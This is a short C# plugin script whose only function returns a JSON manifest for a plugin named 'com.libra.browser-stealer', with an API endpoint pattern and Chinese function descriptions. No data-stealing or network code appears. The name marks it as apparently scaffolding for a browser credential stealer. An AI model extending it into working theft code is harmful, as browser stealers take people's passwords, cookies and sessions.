// ═══════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════

using System;
using System.Text.Json;
using System.Collections.Generic;

string Manifest(dynamic p)
{
    BrowserState.Calls++;
    return JsonSerializer.Serialize(new
    {
        pluginId = "com.libra.browser-stealer",
        host = "ServerScriptService (Roslyn C# Scripting)",
        endpoint = "POST /api/plugin/com.libra.browser-stealer/<函数名>",
        callCount = BrowserState.Calls,
        funcs = new object[]
        {
            new { name = "manifest", desc = "自描述函数目录", options = Array.Empty<object>() },
        },
    });
}


return new Dictionary<string, Func<object, object>>
{
    ["manifest"] = p => Manifest((dynamic)p),
};
